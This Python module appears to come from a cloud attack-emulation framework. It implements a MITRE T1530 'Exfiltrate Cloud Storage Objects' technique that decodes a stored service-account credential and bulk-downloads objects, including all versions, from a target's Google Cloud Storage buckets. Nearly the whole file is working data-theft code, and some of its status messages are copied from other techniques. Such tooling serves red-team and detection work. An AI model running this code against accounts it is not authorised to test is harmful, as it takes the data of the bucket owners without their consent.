import os
from ..base_technique import BaseTechnique, ExecutionStatus, MitreTechnique
from ..technique_registry import TechniqueRegistry
from typing import Dict, Any, Tuple
import json
import base64
import time
import hashlib
# from google.auth.exceptions import RefreshError
from core.gcp.gcp_access import GCPAccess
from google.cloud import storage
from google.cloud.storage import transfer_manager
from google.oauth2.service_account import Credentials as ServiceAccountCredentials
from google.auth.transport.requests import Request



@TechniqueRegistry.register
class GCPExfiltrateCloudStorageObjects(BaseTechnique):
    def __init__(self):
        mitre_techniques = [
            MitreTechnique(
                technique_id="T1530",
                technique_name="Data from Cloud Storage",
                tactics=["Collection"],
                sub_technique_name=None
            )
        ]
        super().__init__("Exfiltrate Cloud Storage Objects", "Exfiltrate Cloud Storage object of buckets in the targeted GCP account", mitre_techniques)

    def execute(self, **kwargs: Any) -> Tuple[ExecutionStatus, Dict[str, Any]]:
        self.validate_parameters(kwargs)
        try:
            name: str = kwargs['name']
            path: str = kwargs['path']
            generation: int = int(kwargs['generation']) if kwargs['generation'] else None
            all_versions: bool = kwargs.get("all_versions", False)
            manager = GCPAccess()
            current_access = manager.get_current_access()
            loaded_credential = json.loads(base64.b64decode(current_access["credential"]))
            scopes = [
                "https://www.googleapis.com/auth/devstorage.read_only"
            ]
            request = Request()
            credential = ServiceAccountCredentials.from_service_account_info(loaded_credential, scopes=scopes)
            credential.refresh(request=request)
            
            client = storage.Client(credentials=credential)
            bucket = client.bucket(bucket_name=name)
            
            objects_path = []
            requsted_blob = []

            if path.startswith("/"):
                path = path.lstrip("/")
            version_enabled : bool = None

            if generation and (path.endswith("/") or all_versions):
                raise ValueError("The path field should not a folder when generation field is not empty")
                
            if generation or all_versions:
                version_enabled = True

            requsted_blob = [blob for blob in bucket.list_blobs(prefix=path, versions=version_enabled)]
            
            current_time = str(time.time())

            hash_object = hashlib.sha256(current_time.encode())
            dir_name = hash_object.hexdigest()[:10]
            destination_path = "./output/cloud_storage_bucket_download/"+  dir_name + "/"

            for blob in requsted_blob:
                if version_enabled:
                    name, format = os.path.splitext(blob.name)
                    filename = f"{name}-{blob.generation}{format}"
                    if all_versions:
                        objects_path.append((blob, destination_path + filename))
                    if blob.generation == generation:
                        os.makedirs(name=destination_path)
                        transfer_manager.download_chunks_concurrently(blob=blob, filename=destination_path + filename)
                        break        
                if not version_enabled: 
                    objects_path.append(blob.name)
            if not version_enabled:
                transfer_manager.download_many_to_path(bucket=bucket, blob_names=objects_path, destination_directory=destination_path)
            if all_versions:
                if path.count("/") > 1:
                    destination_path_all_versions = f"{destination_path}{path.rsplit("/", 1)[0]}"
                    os.makedirs(name=destination_path_all_versions)
                else: os.makedirs(name=destination_path)
                transfer_manager.download_many(blob_file_pairs=objects_path)
            

            
            
            return ExecutionStatus.SUCCESS, {
                "value": {
                    "destination": destination_path,

                },
                "message": f"Successfully established access to target GCP tenant"
            }
        
        except ValueError as e:
            return ExecutionStatus.FAILURE, {
                "error": str(e),
                "message": "Failed to enumerate cloud storage buckets. The project not specified on selected credential or no current saved credential"
            }
        
        except Exception as e:
            return ExecutionStatus.FAILURE, {
                "error": str(e),
                "message": "Failed to establish access to GCP"
            }

    def get_parameters(self) -> Dict[str, Dict[str, Any]]:
        return {
            "name": {"type": "str", "required": True, "default": None, "name": "Name", "input_field_type" : "text"},
            "path": {"type": "str", "required": False, "default": None, "name": "Path", "input_field_type" : "text"},
            "generation": {"type": "str", "required": False, "default": None, "name": "Generation", "input_field_type" : "text"},
            "all_versions": {
                "type": "bool",
                "required": False,
                "default": False,
                "name": "All Versions",
                "input_field_type": "bool"
            },
        }